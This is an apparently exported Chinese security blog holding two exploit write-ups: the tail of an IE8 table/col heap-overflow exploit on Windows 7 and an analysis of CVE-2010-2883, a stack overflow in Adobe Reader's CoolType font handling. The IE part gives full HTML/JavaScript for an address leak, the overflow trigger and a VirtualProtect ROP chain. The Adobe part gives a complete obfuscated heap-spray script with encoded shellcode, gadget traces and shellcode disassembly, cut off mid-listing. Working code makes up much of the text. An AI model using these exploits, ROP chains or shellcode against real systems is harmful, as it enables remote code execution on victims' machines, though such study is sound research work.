&#125; &#125; i += col_span&#125; 漏洞很明显了，循环复制，但是后面明显超过了堆的开辟大小，造成溢出 漏洞利用因为存在 ASLR 和 DEP 保护，所以必须先泄露地址信息绕过 ASLR，之后通过构造 ROP 链绕过 DEP。 win7+ie8泄漏地址信息的脚本如下。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;html&gt;&lt;body&gt;&lt;div id="evil"&gt;&lt;/div&gt;&lt;table style="table-layout:fixed" &gt;&lt;col id="132" width="41" span="9" &gt; &lt;/col&gt;&lt;/table&gt;&lt;script language='javascript'&gt;function strtoint(str) &#123; return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);&#125;var free = "EEEE";while ( free.length &lt; 500 ) free += free;var string1 = "AAAA";while ( string1.length &lt; 500 ) string1 += string1;var string2 = "BBBB";while ( string2.length &lt; 500 ) string2 += string2;var fr = new Array();var al = new Array();var bl = new Array();var div_container = document.getElementById("evil");div_container.style.cssText = "display:none";for (var i=0; i &lt; 500; i+=2) &#123; fr[i] = free.substring(0, (0x100-6)/2); al[i] = string1.substring(0, (0x100-6)/2); bl[i] = string2.substring(0, (0x100-6)/2); var obj = document.createElement("button"); div_container.appendChild(obj);&#125;for (var i=200; i&lt;500; i+=2 ) &#123; fr[i] = null; CollectGarbage();&#125;function leak()&#123; var leak_col = document.getElementById("132"); leak_col.width = "41"; leak_col.span = "19";&#125;function get_leak() &#123; var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13)); str_addr = str_addr - 1410704; alert("mshtml addr :"+str_addr.toString(16));&#125;function trigger_overflow()&#123; var evil_col = document.getElementById("132"); evil_col.width = "1178993"; evil_col.span = "44";&#125;setTimeout(function()&#123;leak()&#125;, 300);setTimeout(function()&#123;get_leak()&#125;,700);//setTimeout(function()&#123;heapspray()&#125;, 900);setTimeout(function()&#123;trigger_overflow()&#125;, 1200);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; &lt;col id=&quot;132&quot; width=&quot;41&quot; span=&quot;9&quot; &gt; 会建立 9个0x1c的堆块。之后定义三个长度为 500 的字符串。之后分配三个字符串数组1234567for (var i=0; i &lt; 500; i+=2) &#123; fr[i] = free.substring(0, (0x100-6)/2); al[i] = string1.substring(0, (0x100-6)/2); bl[i] = string2.substring(0, (0x100-6)/2); var obj = document.createElement("button"); div_container.appendChild(obj);&#125; 之后利用 BSTR 结构特性完成地址信息泄漏。123456789101112function get_leak() &#123; var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13)); alert("CButtonLayout addr :"+str_addr.toString(16)); str_addr = str_addr - 1410704; alert("mshtml addr :"+str_addr.toString(16));&#125;function trigger_overflow()&#123; var evil_col = document.getElementById("132"); evil_col.width = "1178993"; evil_col.span = "44";&#125; 如下图，成功覆盖 BSTR 的长度，之后通过 CButtonLayout 的虚表地址算出 mshtml 的加载基址。这个和书上不一样的是用的开头四字节的虚表地址来计算偏移，不过不重要，结果都一样。之后就可以利用泄露出来的 mshtml 地址构造 rop , 绕过 DEP。后面利用就是先栈劫持到堆上，之后 VirtualProtect 函数修改内存的可执行性，再控制 eip 到堆上已经布置好的 shellcode。rop 的构造如下。12345678910111213141516171819202122var shellcode = unescape("%u"+rop1+"%u"+rop2); // RETshellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBPshellcode+= unescape("%u"+rop5+"%u"+rop6); // XCHG EAX,ESPshellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBPshellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBPshellcode+= unescape("%u"+rop7+"%u"+rop8); // POP EBPshellcode+= unescape("%u1024%u0000"); // Size 0x00001024shellcode+= unescape("%u"+rop9+"%u"+rop10); // POP EDXshellcode+= unescape("%u0040%u0000"); // 0x00000040shellcode+= unescape("%u"+rop11+"%u"+rop12); // POP ECXshellcode+= unescape("%u"+writable1+"%u"+writable2); // Writable Locationshellcode+= unescape("%u"+rop13+"%u"+rop14); // POP EDIshellcode+= unescape("%u"+rop1+"%u"+rop2); // RETshellcode+= unescape("%u"+rop15+"%u"+rop16); // POP ESIshellcode+= unescape("%u"+jmpeax1+"%u"+jmpeax2); // JMP EAXshellcode+= unescape("%u"+rop17+"%u"+rop18); // POP EAXshellcode+= unescape("%u"+vp1+"%u"+vp2); // VirtualProtect()shellcode+= unescape("%u"+rop19+"%u"+rop20); // MOV EAX,DWORD PTR DS:[EAX]shellcode+= unescape("%u"+rop21+"%u"+rop22); // PUSHADshellcode+= unescape("%u"+rop23+"%u"+rop24); // PUSH ESPshellcode+= unescape("%u9090%u9090"); // crapshellcode+= unescape("%u9090%u9090"); // crap 给的资料里面有一个 win7-ie-exp.html,执行后会在 4444 端口监听，如下，成功执行。 win7+ie9/10/11上面说了win7下 IE8 浏览器的利用，在 IE9 及之后的浏览器中存在 Nozzle 保护机制，并且 ie10 之后 BSTR 分配在 Custom Heap 上，所以上面的利用方法并不适合。 Nozzle保护机制（IE）：检测是否存在重复可转换成汇编代码的字段，若存在则阻止其内存申请。 Nozzle 并不检测 VBScript的执行，所以可以利用其绕过，VBArray 的 toArray() 可以堆上分配正常的 BSTR 对象。参考:Study-of-Exploit-Migitation-in-Modern-Browsers-KEENTeam-XCON2013]]></content>
      <tags>
        <tag>old_blog</tag>
        <tag>browser</tag>
        <tag>vuln</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2010-2883]]></title>
    <url>%2F2019%2F01%2F09%2FCVE-2010-2883%2F</url>
    <content type="text"><![CDATA[从备份失败的老博客还原出来的 漏洞概览本来想通过 poc 样本去定位漏洞地址，后来发现找的样本都无法定位到，感觉是我操作有问题，总是蹦出来异常处理，算了，就用泉哥用的上帝视角模式吧，直接通过漏洞点进行分析。漏洞点在0x803ddab 处，在调用 strcat 函数时没有对长度检查，造成溢出，并且有程序上下文可以猜测是在对字体处理时出现了问题。下面会详细分析这个漏洞是如何触发的，在分析之前需要先简单了解下 pdf 文件的结构，可以参考:PDF文件解析与PDF恶代分析中的一些坑 触发条件我使用的样本是 msf 生成的可以弹出计算机的，原理都一样。先来了解下 TTF 字体的一些信息。首先是 tOffsetTable 记录了表结构的信息，可以理解为一个总表吧。1234567typedef struct tOffsetTable &#123; TT_Fixed SFNT_Ver; //sfnt version 0x00010000 for version 1.0. USHORT numTables; //Number of tables. USHORT searchRange; //(Maximum power of 2 &lt;= numTables) x 16. USHORT entrySelector; // Log2(maximum power of 2 &lt;= numTables). USHORT rangeShift; // NumTables x 16-searchRange. &#125;; 然后是 tTable 结构体，记录了相关表的偏移及大小。实际存储的时候会是一个数组，因为存了很多表，之后就是各个表的具体内容。123456789typedef struct tTable &#123; union &#123; char asChar[4]; // 4 -byte identifier. ULONG asLong; &#125; Tag; ULONG checkSum; // CheckSum for this table. ULONG offset; // Offset from beginning of TrueType font file. ULONG length; // Length of this table. &#125;; 可以通过 010editor 的模板功能进行查看，如下(字体数据结构是通过 PdfStreamDumper得到的)SING 的结构如下图:下面我们看下实验的样本中 SING 结构的数据先来简单分析下漏洞点附近的代码12345678910111213141516171819push offset aSing ; "SING"push edi ; intlea ecx, [ebp+108h+var_12C]call sub_8021B06mov eax, [ebp+108h+var_12C]cmp eax, esimov byte ptr [ebp+108h+var_10C], 2jz short loc_803DDC4mov ecx, [eax]and ecx, 0FFFFhjz short loc_803DD9Fcmp ecx, 100hjnz short loc_803DDC0add eax, 10hpush eax ; char *lea eax, [ebp+108h+var_108]push eax ; char *mov [ebp+108h+var_108], 0call strcat 先看第一个函数 sub_8021B06(ecx, edi, str_SING);, 第一个参数是一个对象，但是现在并不能确定这个函数的作用，可以通过 windbg 加断点比较前后数据的变化来猜测。先看下在函数执行前执行函数后再一次进行比较，可以猜到函数的作用是根据存储 TTF 数据的地址找到 SING 表结构的地址。所以后面指令的作用基本就得到了，如下12345678910111213141516171819push offset aSing ; "SING"push edi ; intlea ecx, [ebp+108h+var_12C]call sub_8021B06 mov eax, [ebp+108h+var_12C] ;eax = SING addr cmp eax, esimov byte ptr [ebp+108h+var_10C], 2 jz short loc_803DDC4 mov ecx, [eax] ;versionand ecx, 0FFFFh jz short loc_803DD9F cmp ecx, 100h jnz short loc_803DDC0 add eax, 10h ;SING+0x10 = SING-&gt;uniqueNamepush eax ; char * ;uniqueNamelea eax, [ebp+108h+var_108] ;stack addrpush eax ; char * mov [ebp+108h+var_108], 0call strcat 所以现在漏洞很清晰啦，通过 strcat 函数将 uniqueName 的字符串来连接到栈地址，但是没有检查长度，造成溢出。1char *strcat(char *dest, const char *src); 虽然只是个栈溢出，但是因为软件过于复杂，并且还存在 GS 保护(虽然后面的利用 GS 没卵用)，所以利用起来难度还是很大的，至少对我这个菜鸡是这样，下面我们来看下是如何利用的。 利用技巧在 strcat 函数执行前查看帧栈信息，与执行后进行比较可以看到栈上的数据的改动造成了相关帧栈信息的变动，例如 0x0c0c0c0c,可以很自然的想到 heapspray。实际上面代码还有个很无法理解的地方123.text:0803DCF9 push ebp.text:0803DCFA sub esp, 104h.text:0803DD00 lea ebp, [esp-4] 编译器这样改 ebp 是为了优化??? 不懂后面的通过栈上的可控变量控制 eip 这一步感觉实在想不出来，感觉可能是通过污点分析对可控数据监控，当遇到能通过 call 调用时记录下来，然后利用的。在 0x0808B308 处的指令可以通过栈上存储的值调用相应地址的指令，通过 windbg 跟踪来看下。跟踪直到运行到 0808B308 处，整理运行过的指令。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061070803ddb6 8bcb mov ecx,ebx0803ddb8 e88634fcff call CoolType+0x1243 (08001243)0803ddbd 8b45dc mov eax,dword ptr [ebp-24h] ss:0023:0012e4b4=046cb0780803ddc0 c645ef01 mov byte ptr [ebp-11h],1 ss:0023:0012e4c7=000803ddc4 3bc6 cmp eax,esi0803ddc6 c645fc01 mov byte ptr [ebp-4],1 ss:0023:0012e4d4=020803ddca 7407 je CoolType+0x3ddd3 (0803ddd3) [br=0]0803ddcc 50 push eax0803ddcd e8ed3a0000 call CoolType+0x418bf (080418bf)0803ddd2 59 pop ecx0803ddd3 807def00 cmp byte ptr [ebp-11h],0 ss:0023:0012e4c7=010803ddd7 0f85cc000000 jne CoolType+0x3dea9 (0803dea9) [br=1]0803dea9 8d45e4 lea eax,[ebp-1Ch]0803deac 50 push eax0803dead 53 push ebx0803deae 57 push edi0803deaf e82a8dfdff call CoolType+0x16bde (08016bde)08016bde 55 push ebp08016bdf 81ec60060000 sub esp,660h08016be5 8d6c24fc lea ebp,[esp-4]08016be9 a1b80f2308 mov eax,dword ptr [CoolType!CTCleanup+0xe26ee (08230fb8)] ds:0023:08230fb8=67fbe93a08016bee 33c5 xor eax,ebp08016bf0 898560060000 mov dword ptr [ebp+660h],eax ss:0023:0012e458=0012e4cc08016bf6 6a50 push 50h08016bf8 b8325d1708 mov eax,offset CoolType!CTCleanup+0x27468 (08175d32)08016bfd e8cf150300 call CoolType!CTInit+0x1b2e (080481d1)08016c02 8b8574060000 mov eax,dword ptr [ebp+674h] ss:0023:0012e46c=0012e4bc08016c08 8bb570060000 mov esi,dword ptr [ebp+670h] ss:0023:0012e468=0012e60808016c0e 8bbd6c060000 mov edi,dword ptr [ebp+66Ch] ss:0023:0012e464=0012e71808016c14 8945a8 mov dword ptr [ebp-58h],eax ss:0023:0012dda0=ffeb000008016c17 b850a62308 mov eax,offset CoolType!CTCleanup+0xebd86 (0823a650)08016c1c 50 push eax08016c1d 8975e4 mov dword ptr [ebp-1Ch],esi ss:0023:0012dddc=1200b8e708016c20 8945a4 mov dword ptr [ebp-5Ch],eax ss:0023:0012dd9c=0000000108016c23 ff1530f11808 call dword ptr [CoolType!CTCleanup+0x40866 (0818f130)] ds:0023:0818f130=&#123;ntdll!RtlEnterCriticalSection (7c921000)&#125;08016c29 33db xor ebx,ebx08016c2b 57 push edi08016c2c 895dfc mov dword ptr [ebp-4],ebx ss:0023:0012ddf4=ffffffff08016c2f 895dd0 mov dword ptr [ebp-30h],ebx ss:0023:0012ddc8=1200b8e708016c32 895dec mov dword ptr [ebp-14h],ebx ss:0023:0012dde4=8123437808016c35 e8e24e0000 call CoolType+0x1bb1c (0801bb1c)08016c3a 3bc3 cmp eax,ebx08016c3c 59 pop ecx08016c3d 8945e8 mov dword ptr [ebp-18h],eax ss:0023:0012dde0=8d235d8808016c40 0f8488060000 je CoolType+0x172ce (080172ce) [br=0]08016c46 6a01 push 108016c48 53 push ebx08016c49 53 push ebx08016c4a 8d45ec lea eax,[ebp-14h]08016c4d 50 push eax08016c4e 8d45d0 lea eax,[ebp-30h]08016c51 50 push eax08016c52 57 push edi08016c53 ff75e8 push dword ptr [ebp-18h] ss:0023:0012dde0=01efc87c08016c56 e8c64e0000 call CoolType+0x1bb21 (0801bb21)0801bb21 55 push ebp0801bb22 8bec mov ebp,esp0801bb24 ff7520 push dword ptr [ebp+20h] ss:0023:0012dd88=000000010801bb27 8b4d08 mov ecx,dword ptr [ebp+8] ss:0023:0012dd70=01efc87c0801bb2a ff751c push dword ptr [ebp+1Ch] ss:0023:0012dd84=000000000801bb2d 8b01 mov eax,dword ptr [ecx] ds:0023:01efc87c=081a601c0801bb2f ff7518 push dword ptr [ebp+18h] ss:0023:0012dd80=000000000801bb32 ff05a0a62308 inc dword ptr [CoolType!CTCleanup+0xebdd6 (0823a6a0)] ds:0023:0823a6a0=000000000801bb38 ff7514 push dword ptr [ebp+14h] ss:0023:0012dd7c=0012dde40801bb3b ff7510 push dword ptr [ebp+10h] ss:0023:0012dd78=0012ddc80801bb3e ff750c push dword ptr [ebp+0Ch] ss:0023:0012dd74=0012e7180801bb41 ff10 call dword ptr [eax] ds:0023:081a601c=0808b1160808b116 55 push ebp0808b117 8bec mov ebp,esp0808b119 51 push ecx0808b11a 53 push ebx0808b11b 56 push esi0808b11c 57 push edi0808b11d 8b7d08 mov edi,dword ptr [ebp+8] ss:0023:0012dd50=0012e7180808b120 57 push edi0808b121 8bf1 mov esi,ecx0808b123 e802ffffff call CoolType!CTInit+0x44987 (0808b02a)0808b128 33db xor ebx,ebx0808b12a 84c0 test al,al0808b12c 0f8499010000 je CoolType!CTInit+0x44c28 (0808b2cb) [br=0]0808b132 385d1c cmp byte ptr [ebp+1Ch],bl ss:0023:0012dd64=010808b135 0f8590010000 jne CoolType!CTInit+0x44c28 (0808b2cb) [br=1]0808b2cb 8b06 mov eax,dword ptr [esi] ds:0023:01efc87c=081a601c0808b2cd 885d1f mov byte ptr [ebp+1Fh],bl ss:0023:0012dd67=000808b2d0 ff5070 call dword ptr [eax+70h] ds:0023:081a608c=080899370808b2d3 57 push edi0808b2d4 8d4e14 lea ecx,[esi+14h]0808b2d7 e86432f9ff call CoolType+0x1e540 (0801e540)0808b2dc c686e000000001 mov byte ptr [esi+0E0h],1 ds:0023:01efc95c=000808b2e3 8b473c mov eax,dword ptr [edi+3Ch] ds:0023:0012e754=0012e6d00808b2e6 3bc3 cmp eax,ebx0808b2e8 8986f4020000 mov dword ptr [esi+2F4h],eax ds:0023:01efcb70=0012e6d00808b2ee 899ef8020000 mov dword ptr [esi+2F8h],ebx ds:0023:01efcb74=000000000808b2f4 895dfc mov dword ptr [ebp-4],ebx ss:0023:0012dd44=01efc87c0808b2f7 7507 jne CoolType!CTInit+0x44c5d (0808b300) [br=1]0808b300 8d4dfc lea ecx,[ebp-4]0808b303 51 push ecx0808b304 53 push ebx0808b305 6a03 push 30808b307 50 push eax0808b308 ff10 call dword ptr [eax] ds:0023:0012e6d0=4a80cb38 下面来看下 call dword ptr [eax] 会执行什么指令。123456789101112131415161718192021220:000&gt; r eax eax=0012e6d00:000&gt; dd 0012e6d0 L10012e6d0 4a80cb380:000&gt; !address 4a80cb38*************************************************************************Usage: ImageAllocation Base: 4a800000Base Address: 4a801000End Address: 4a849000Region Size: 00048000Type: 01000000 MEM_IMAGEState: 00001000 MEM_COMMITProtect: 00000020 PAGE_EXECUTE_READMore info: lmv m icucnv36More info: !lmi icucnv36More info: ln 0x4a80cb380:000&gt; u 4a80cb38icucnv36!ucnv_toUChars_3_6+0x162:4a80cb38 81c594070000 add ebp,794h4a80cb3e c9 leave4a80cb3f c3 ret 所以 icucnv36!ucnv_toUChars_3_6+0x162 处的 gadget 的作用就很明显了， stack pivot。单步执行看下下一个 gadget。12345678910111213141516171819202122232425262728293031323334353637383940414243440:000&gt; r ebpebp=0012dd480:000&gt; dd ebp0012dd48 0012dd68 0801bb43 0012e718 0012ddc80012dd58 0012dde4 00000000 00000000 000000010012dd68 0012ddf8 08016c5b 01efc87c 0012e7180012dd78 0012ddc8 0012dde4 00000000 000000000012dd88 00000001 67e934c2 0012e718 000000000012dd98 0012e608 0823a650 0012e4bc ff2700000012dda8 00000003 1200ccdd 81234378 1200b8e70012ddb8 120058e8 1200b8e7 8d235d88 120034de0:000&gt; peax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718eip=4a80cb3e esp=0012dd24 ebp=0012e4dc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202icucnv36!ucnv_toUChars_3_6+0x168:4a80cb3e c9 leave0:000&gt; dd ebp0012e4dc f012512c 4a82a714 0c0c0c0c 47dabcf20012e4ec 5c064f94 5c53850a 57ef3bba e910375e0012e4fc ef4039c2 f0e3b6aa 61a8c5b4 c2474a7a0012e50c 15da11a6 436a7060 1d9d4505 1c1f88da0012e51c 249ca0df e4d40d46 269a3dfc daed6b970012e52c c920c5fc 2d4265c3 cb1f5a53 5a0c27e00012e53c 69fd2e39 6d70eb0d b877a4e9 db9a8a4d0012e54c 883c0409 f6fa0ea5 6634d433 e7f0ef0d0:000&gt; peax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718eip=4a80cb3f esp=0012e4e0 ebp=f012512c iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202icucnv36!ucnv_toUChars_3_6+0x169:4a80cb3f c3 ret0:000&gt; peax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718eip=4a82a714 esp=0012e4e4 ebp=f012512c iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:4a82a714 5c pop esp0:000&gt; dd esp L10012e4e4 0c0c0c0c0:000&gt; u 4a82a714 icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:4a82a714 5c pop esp4a82a715 c3 ret 通过两个 gadget 控制 eip 到了 [0x0c0c0c0c],剩下就是堆喷射啦。如果用图来表示这个过程的话，大概是下面这样吧。emmmmmm 现在已经控制 eip = [0x0c0c0c0c] 啦，剩下的就好多了， 堆喷射完成 shellcode 的布局，然后就是使 eip 滑入放置好的 shllcode 啦，堆喷射的代码可以通过 PdfStreamDumper 得到。12345678910111213var mqraPQZSAwAwCczJcaACUcIIwCnLbss = unescape;var twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA = mqraPQZSAwAwCczJcaACUcIIwCnLbss( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u64b8%u9c0f%uda97%ud9cc%u2474%u5ef4%uc929%u31b1%uc683%u3104%u0f46%u4603%ued6b%u6b69%u739b%u9491%u145b%u711b%u146a%uf17f%ua4dc%u570b%u4fd0%u4c59%u3d63%u6376%u88c4%u4aa0%ua1d5%ucd91%ub855%u2dc5%u7364%u2f18%u6ea1%u7dd1%ue47a%u9244%ub00f%u1954%u5443%ufedd%u5713%u50cc%u0e28%u53ce%u3afd%u4c47%u07e2%ue711%ufcd0%u21a0%ufc29%u0c0f%u0f86%u4851%uf020%ua024%u8d53%u773e%u492e%u6cca%u1a88%u496c%uce29%u1aeb%ubb25%u4478%u3a29%ufeac%ub755%ud153%u83dc%uf577%u5085%uac19%u3663%uae26%ue7cc%ua482%ufce0%ue6be%u026e%u9d4c%u04dc%u9e4e%u6d70%u157f%uea1f%ufc80%u0464%u5dcb%u8dcc%u3792%ud04d%ue224%ued91%u07a6%u0a69%u6db6%u566c%u9d70%uc71c%ua115%ue8b3%uc23f%u7b52%u2ba3%ufbf1%u3446' );var NrWJJGMFyDgCbq = mqraPQZSAwAwCczJcaACUcIIwCnLbss( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );while (NrWJJGMFyDgCbq.length + 20 + 8 &lt; 65536) NrWJJGMFyDgCbq+=NrWJJGMFyDgCbq;BuWToJIZTn = NrWJJGMFyDgCbq.substring(0, (0x0c0c-0x24)/2);BuWToJIZTn += twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA;BuWToJIZTn += NrWJJGMFyDgCbq;wrIFk = BuWToJIZTn.substring(0, 65536/2);while(wrIFk.length &lt; 0x80000) wrIFk += wrIFk;TjCv = wrIFk.substring(0, 0x80000 - (0x1020-0x08) / 2);var erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA = new Array();for (wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj=0;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj&lt;0x1f0;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj++) erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA[wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj]=TjCv+"s"; 上面的 shellcode 是能还原出来的，不过为了熟悉下调试还是用 windbg吧。1234567890:000&gt; dd 0c0c0c0c L200c0c0c0c 4a8063a5 4a8a0000 4a802196 4a801f900c0c0c1c 4a84903c 4a80b692 4a801064 4a8522c80c0c0c2c 10000000 00000000 00000000 000000020c0c0c3c 00000102 00000000 4a8063a5 4a8010640c0c0c4c 4a842db2 4a802ab1 00000008 4a80a8a60c0c0c5c 4a801f90 4a849038 4a80b692 4a8010640c0c0c6c ffffffff 00000000 00000040 000000000c0c0c7c 00010000 00000000 4a8063a5 4a801064 我们先来看下堆中这些数据的内容12340:000&gt; u 4a8063a5 icucnv36!uenum_count_3_6+0x1d:4a8063a5 59 pop ecx4a8063a6 c3 ret 执行完成后 ecx = 0x4a8a0000,再来看下 0x4a802196 处12340:000&gt; u 4a802196icucnv36!ubidi_getClassCallback_3_6+0x22:4a802196 8901 mov dword ptr [ecx],eax4a802198 c3 ret 执行完后 [0x4a8a0000] = 0x0012e6d0,之后跳到了 0x4a801f90。12340:000&gt; u 4a801f90icucnv36!ubidi_getDirection_3_6+0x18:4a801f90 58 pop eax4a801f91 c3 ret 最后 eax =4a84903c,跳到了 0x4a80b692。1230:000&gt; u 4a80b692icucnv36!u_errorName_3_6+0xdf:4a80b692 ff20 jmp dword ptr [eax] 0x4a84903c 实际上是 icucnv36.dll 里函数CreateFileA 在导入表中的地址，所以这样就完成了对CreateFileA函数的调用。函数参数如下123450:000&gt; dd 0c0c0c28 L70c0c0c28 4a8522c8 10000000 00000000 000000000c0c0c38 00000002 00000102 000000000:000&gt; da 4a8522c84a8522c8 &quot;iso88591&quot; 即CreateFileA(0x4a8522c8,GENERIC_ALL,0,NULL,CREATE_ALWAYS,HIDDEN|TEMPORARY,NULL)。之后通过 0x4a801064 处的 ret 指令重新反回到了icucnv36.dll。12345eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718eip=4a801064 esp=0c0c0c44 ebp=f012512c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200293icucnv36+0x1064:4a801064 c3 ret 然后看下如何再一次控制 eip 去完成我们想做的事情。1234567891011121314151617181920212223242526272829300:000&gt; eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718eip=4a8063a5 esp=0c0c0c48 ebp=f012512c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200293icucnv36!uenum_count_3_6+0x1d:4a8063a5 59 pop ecx0:000&gt; peax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718eip=4a8063a6 esp=0c0c0c4c ebp=f012512c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200293icucnv36!uenum_count_3_6+0x1e:4a8063a6 c3 ret0:000&gt; eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718eip=4a842db2 esp=0c0c0c50 ebp=f012512c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200293icucnv36!u_strFromUTF32_3_6+0x142:4a842db2 97 xchg eax,edi0:000&gt; peax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328eip=4a842db3 esp=0c0c0c50 ebp=f012512c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200293icucnv36!u_strFromUTF32_3_6+0x143:4a842db3 c3 ret0:000&gt; peax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328eip=4a802ab1 esp=0c0c0c54 ebp=f012512c iopl=0 nv up ei ng nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200293icucnv36!ubidi_getDummy_3_6+0xc7:4a802ab1 5b pop ebx 实际上下面要执行的 gadget 的作用是重新控制 eip ，和之前的call dword ptr [eax] 是类似的，使用的 gadget 如下:1234567891011121314151617181920212223icucnv36!ubidi_getDummy_3_6+0xc7:4a802ab1 5b pop ebx4a802ab2 c3 reticucnv36!uprv_pathIsAbsolute_3_6+0xd:4a80a8a6 213c5c and dword ptr [esp+ebx*2],edi ss:0023:0c0c0c6c=ffffffff4a80a8a9 7503 jne icucnv36!uprv_pathIsAbsolute_3_6+0x15 (4a80a8ae) [br=1]4a80a8ae 3c2f cmp al,2Fh4a80a8b0 74f9 je icucnv36!uprv_pathIsAbsolute_3_6+0x12 (4a80a8ab) [br=0]4a80a8b2 3c41 cmp al,41h4a80a8b4 7c04 jl icucnv36!uprv_pathIsAbsolute_3_6+0x21 (4a80a8ba) [br=1]4a80a8ba 3c61 cmp al,61h4a80a8bc 7c0a jl icucnv36!uprv_pathIsAbsolute_3_6+0x2f (4a80a8c8) [br=1]4a80a8c8 32c0 xor al,al4a80a8ca c3 reticucnv36!ubidi_getDirection_3_6+0x18:4a801f90 58 pop eax4a801f91 c3 reticucnv36!u_errorName_3_6+0xdf:4a80b692 ff20 jmp dword ptr [eax] ds:0023:4a849038=&#123;kernel32!CreateFileMappingA (7c8094ee)&#125; 可以看到这次调用了 CreateFileMappingA 函数，之后用相同的方法执行 MapViewOfFile 函数完成一段可执行内存空间的开辟。之后调用 memcpy 函数完成堆上 shellcode 的复制。查看 shellcode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394029e0000 b8640f9c97 mov eax,979C0F64h029e0005 dacc fcmove st,st(4)029e0007 d97424f4 fnstenv [esp-0Ch]029e000b 5e pop esi029e000c 29c9 sub ecx,ecx029e000e b131 mov cl,31h029e0010 83c604 add esi,4029e0013 31460f xor dword ptr [esi+0Fh],eax029e0016 03460f add eax,dword ptr [esi+0Fh]029e0019 e2f5 loop 029e0010029e001b fc cld029e001c e882000000 call 029e00a3029e0021 60 pushad029e0022 89e5 mov ebp,esp029e0024 31c0 xor eax,eax029e0026 648b5030 mov edx,dword ptr fs:[eax+30h]029e002a 8b520c mov edx,dword ptr [edx+0Ch]029e002d 8b5214 mov edx,dword ptr [edx+14h]029e0030 8b7228 mov esi,dword ptr [edx+28h]029e0033 0fb74a26 movzx ecx,word ptr [edx+26h]029e0037 31ff xor edi,edi029e0039 ac lods byte ptr [esi]029e003a 3c61 cmp al,61h029e003c 7c02 jl 029e0040029e003e 2c20 sub al,20h029e0040 c1cf0d ror edi,0Dh029e0043 01c7 add 